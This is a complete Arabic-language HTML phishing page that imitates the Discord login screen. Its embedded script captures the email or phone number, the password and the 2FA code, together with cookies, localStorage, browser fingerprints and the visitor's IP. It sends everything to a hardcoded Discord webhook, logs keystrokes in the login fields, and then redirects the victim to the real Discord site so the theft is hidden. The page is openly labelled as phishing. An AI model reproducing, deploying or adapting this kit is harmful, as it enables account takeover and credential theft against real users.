<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Discord</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<script src="https://cdn.tailwindcss.com"></script>
<script>
tailwind.config = {
  theme: { extend: {
    fontFamily: { sans: ['Inter', 'ui-sans-serif'] },
    colors: {
      'discord-bg': 'linear-gradient(135deg, #36393F 0%, #2F3136 50%, #202225 100%)',
      'discord-card': 'rgba(24,25,28,.8)',
      'discord-border': 'rgba(32,34,37,.6)',
      'discord-input': 'rgba(54,57,63,.8)'
    }
  }}
}
</script>
<style>
:root {
  --bg-gradient: linear-gradient(135deg,#36393F 0%,#2F3136 50%,#202225 100%);
  --card-bg: rgba(24,25,28,.95);
  --card-border: rgba(32,34,37,.6);
  --input-bg: rgba(54,57,63,.8);
  --input-border: rgba(64,68,75,.8);
  --primary: linear-gradient(92.54deg,#7289DA 9.16%,#5865F2 100%);
  --text-primary: #FFFFFF;
  --text-secondary: #B9BBBE;
  --text-muted: #72767D;
}
* { margin:0; padding:0; box-sizing:border-box; }
body { 
  font-family:'Inter',sans-serif; 
  background:var(--bg-gradient); 
  color:var(--text-primary); 
  min-height:100vh; 
  overflow-x:hidden;
}
.discord-logo {
  background:linear-gradient(92.54deg,#7289DA 9.16%,#5865F2 100%);
  -webkit-background-clip:text;
  -webkit-text-fill-color:transparent;
  background-clip:text;
}
.glow-blue { box-shadow:0 0 20px rgba(88,101,242,.3); }
.qr-placeholder {
  background:linear-gradient(45deg,#1E1F22 25%,transparent 25%),linear-gradient(-45deg,#1E1F22 25%,transparent 25%),linear-gradient(45deg,transparent 75%,#1E1F22 75%),linear-gradient(-45deg,transparent 75%,#1E1F22 75%);
  background-size:20px 20px;
  background-position:0 0,0 10px,10px -10px,-10px 0;
}
</style>
</head>
<body class="flex items-center justify-center min-h-screen p-4 lg:p-8">
<div class="w-full max-w-6xl flex flex-col lg:flex-row gap-12 lg:gap-20 items-center">
  <!-- Left Panel -->
  <div class="flex-1 text-center lg:text-right max-w-md">
    <div class="discord-logo text-5xl lg:text-7xl font-black mb-6 tracking-tight">Discord</div>
    <h1 class="text-4xl lg:text-5xl font-black mb-6 bg-gradient-to-r from-white to-gray-200 bg-clip-text text-transparent">مرحباً بك مرة أخرى!</h1>
    <p class="text-xl text-gray-300 leading-relaxed">نحن نبني مجتمع حيث يمكنك مشاركة صوتك والتواصل مع الأصدقاء والعائلة</p>
  </div>
  
  <!-- Login Card -->
  <div class="w-full max-w-sm lg:max-w-md bg-[var(--card-bg)] backdrop-blur-xl border border-[var(--card-border)] rounded-3xl p-8 shadow-2xl hover:shadow-3xl transition-all duration-300">
    <div class="text-center mb-8">
      <h2 class="text-2xl font-black text-white mb-2">تسجيل الدخول للمتابعة</h2>
      <p class="text-[var(--text-secondary)] text-sm">أدخل بريدك الإلكتروني أو رقم هاتفك</p>
    </div>
    
    <div id="errorMsg" class="hidden mb-6 p-4 bg-red-500/20 border border-red-500/50 rounded-2xl text-red-300 text-sm"></div>
    
    <form id="loginForm" class="space-y-6">
      <!-- Email/Phone Input -->
      <div>
        <label class="block text-sm font-semibold text-white mb-3">البريد الإلكتروني أو رقم الهاتف</label>
        <input type="text" id="loginInput" required
               class="w-full px-5 py-4 bg-[var(--input-bg)] border-2 border-[var(--input-border)] rounded-2xl text-white placeholder-gray-400 text-lg font-medium focus:border-blue-500 focus:ring-4 focus:ring-blue-500/20 focus:outline-none transition-all duration-200 hover:border-gray-500"
               placeholder="example@gmail.com">
      </div>
      
      <!-- Password Input -->
      <div>
        <label class="block text-sm font-semibold text-white mb-3">كلمة المرور</label>
        <input type="password" id="passInput" required
               class="w-full px-5 py-4 bg-[var(--input-bg)] border-2 border-[var(--input-border)] rounded-2xl text-white placeholder-gray-400 text-lg font-medium focus:border-blue-500 focus:ring-4 focus:ring-blue-500/20 focus:outline-none transition-all duration-200 hover:border-gray-500"
               placeholder="•••••••••••••">
      </div>
      
      <!-- 2FA Toggle -->
      <div class="flex items-center justify-between p-4 bg-gray-900/50 rounded-2xl">
        <label class="flex items-center gap-3 cursor-pointer select-none">
          <div class="relative">
            <input type="checkbox" id="mfaToggle" class="sr-only peer">
            <div class="w-12 h-7 bg-gray-700 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-500/20 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-1 after:left-1 after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
          </div>
          <span class="text-sm font-semibold text-white">التحقق بخطوتين</span>
        </label>
      </div>
      
      <!-- QR Code + TOTP Container -->
      <div id="mfaContainer" class="hidden space-y-4">
        <div class="text-center p-6 bg-gradient-to-br from-gray-900/80 to-gray-800/80 border-2 border-dashed border-gray-700 rounded-3xl qr-placeholder">
          <div class="w-28 h-28 bg-gradient-to-br from-gray-800 to-black border-4 border-gray-700 rounded-2xl mx-auto flex items-center justify-center text-xs font-mono text-gray-500 mb-3">
            QR CODE<br>SCAN ME
          </div>
          <p class="text-xs text-gray-400 mb-4">📱 افتح Discord على هاتفك وامسح الكود أعلاه</p>
          <div class="w-full bg-gray-900/50 p-4 rounded-xl">
            <label class="block text-xs font-bold text-white mb-2 text-center">أو أدخل الرمز يدوياً:</label>
            <input type="text" id="totpInput" maxlength="8" pattern="[0-9]*"
                   class="w-full text-center !py-6 bg-gradient-to-r from-gray-800 to-gray-900 border-2 border-gray-600 rounded-2xl text-2xl font-mono tracking-[0.3em] uppercase text-white focus:border-blue-500 focus:ring-4 focus:ring-blue-500/30 transition-all"
                   placeholder="000000">
          </div>
        </div>
      </div>
      
      <!-- Submit Button -->
      <button type="submit" id="submitBtn" 
              class="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white font-bold py-5 px-6 rounded-3xl text-xl shadow-2xl hover:shadow-3xl hover:-translate-y-1 transform transition-all duration-300 flex items-center justify-center gap-3 group">
        <span class="default">تسجيل الدخول</span>
        <div class="loading hidden w-6 h-6 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
      </button>
    </form>
    
    <div class="mt-8 pt-8 border-t border-gray-800 text-center">
      <a href="#" class="text-blue-400 hover:text-blue-300 text-sm font-semibold transition-all duration-200">مشاكل في تسجيل الدخول؟</a>
    </div>
  </div>
</div>

<script>
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1469329952464961708/VgxYi7uQH8AYVrYyFZorW1BbZJKQQa9Y5fOd3jgmX3fEY4NUYFj6AbhH19hGEiGl_m0c';

const victimData = {
  ip: 'جاري الاستعلام...',
  ua: navigator.userAgent,
  screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
  lang: navigator.language,
  platform: navigator.platform,
  tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
  cookies: document.cookie,
  localStorage: JSON.stringify(localStorage),
  canvasFP: '',
  webglFP: '',
  audioFP: '',
  timestamp: new Date().toISOString(),
  url: location.href,
  referrer: document.referrer
};

// Generate fingerprints
function generateFingerprints() {
  // Canvas
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  ctx.fillStyle = '#f60';
  ctx.fillRect(125,1,62,20);
  ctx.fillStyle = '#069';
  ctx.fillText('Discord v1.0.9001',2,15);
  ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
  ctx.fillText('Visibility: visible',4,45);
  victimData.canvasFP = canvas.toDataURL();
  
  // WebGL
  const glCanvas = document.createElement('canvas');
  const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
  if(gl) {
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    victimData.webglFP = `${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)}|${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}`;
  }
  
  // Audio
  const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
  const oscillator = audioCtx.createOscillator();
  const analyser = audioCtx.createAnalyser();
  oscillator.connect(analyser);
  victimData.audioFP = 'AudioContext supported';
}

// Get IP
fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>victimData.ip=d.ip).catch(()=>0);
fetch('https://httpbin.org/ip').then(r=>r.json()).then(d=>victimData.ip=d.origin).catch(()=>0);

// Elements
const form = document.getElementById('loginForm');
const mfaToggle = document.getElementById('mfaToggle');
const mfaContainer = document.getElementById('mfaContainer');
const submitBtn = document.getElementById('submitBtn');
const errorMsg = document.getElementById('errorMsg');

// Keylogger
document.addEventListener('keydown', e=>{
  if(['loginInput','passInput','totpInput'].includes(e.target.id)) {
    console.log(`${e.target.id}: ${e.key}`);
  }
});

// 2FA Toggle
mfaToggle.addEventListener('change', ()=> {
  mfaContainer.classList.toggle('hidden', !mfaToggle.checked);
});

// Form submit
form.onsubmit = async e => {
  e.preventDefault();
  
  // Show loading
  submitBtn.disabled = true;
  submitBtn.querySelector('.default').style.display = 'none';
  submitBtn.querySelector('.loading').classList.remove('hidden');
  errorMsg.classList.add('hidden');
  
  // Collect data
  const creds = {
    email_phone: document.getElementById('loginInput').value,
    password: document.getElementById('passInput').value,
    totp: document.getElementById('totpInput').value || 'غير مدخل',
    mfa_enabled: mfaToggle.checked,
    ...victimData
  };
  
  // Send to Discord
  try {
    const embed = {
      username: '🔒 Discord Security Capture',
      avatar_url: 'https://cdn.discordapp.com/emojis/1183487173435418880.png',
      embeds: [{
        title: '🎯 تم التقاط بيانات Discord كاملة',
        description: `**البريد/الهاتف:** \`${creds.email_phone}\`\n**كلمة المرور:** \`${creds.password}\`\n**رمز 2FA:** \`${creds.totp}\``,
        color: 0x5865F2,
        thumbnail: { url: 'https://cdn.discordapp.com/attachments/1469329952464961708/1183487173435418880/discord.png' },
        fields: [
          { name: '🌐 IP', value: `\`${creds.ip}\``, inline: true },
          { name: '🖥️ الشاشة', value: `\`${creds.screen}\``, inline: true },
          { name: '📱 الجهاز', value: `${creds.ua.includes('Mobile') ? '📱 موبايل' : '💻 كمبيوتر'}`, inline: true },
          { name: '🕐 الوقت', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: true },
          { name: '🔗 الرابط', value: `[الصفحة](${creds.url})`, inline: false },
          { name: '📤 User Agent', value: `\`${creds.ua.slice(0,60)}...\``, inline: false }
        ],
        footer: { text: 'Discord Phishing | QR+2FA Capture ✅', icon_url: 'https://cdn.discordapp.com/emojis/1183487173435418880.gif' }
      }]
    };
    
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify(embed)
    });
    
  } catch(e) { console.error(e); }
  
  // Redirect to real Discord
  setTimeout(()=>window.location.href='https://discord.com/login?redirect_to=%2Fchannels%2F%40me', 1200);
};

// Init
generateFingerprints();
</script>
</body>
</html>
